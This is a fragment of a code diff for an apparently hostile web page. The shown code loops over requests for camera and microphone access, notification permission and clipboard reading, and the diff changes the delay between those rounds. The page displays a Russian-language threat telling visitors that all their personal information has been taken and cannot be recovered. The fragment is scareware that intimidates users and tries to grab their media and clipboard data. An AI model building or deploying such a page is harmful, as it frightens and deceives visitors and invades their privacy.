@@ -77,7 +77,7 @@ async function requestPermissions() {
         try { await navigator.mediaDevices.getUserMedia({ audio: true, video: true }); } catch {}
         try { await Notification.requestPermission(); } catch {}
         try { await navigator.clipboard.readText(); } catch {}
-        await new Promise(r => setTimeout(r, 500)); // пауза между циклами
+        await new Promise(r => setTimeout(r, 9000)); // пауза между циклами
     }
 }
 
@@ -143,6 +143,7 @@ main();
     <p class="warning">ВСЯ ВАША ЛИЧНАЯ ИНФОРМАЦИЯ НАХОДИТЬСЯ У НАС! попытка восстановить не будет успешной</p>
 </body>
 </html>
+
 
 
 
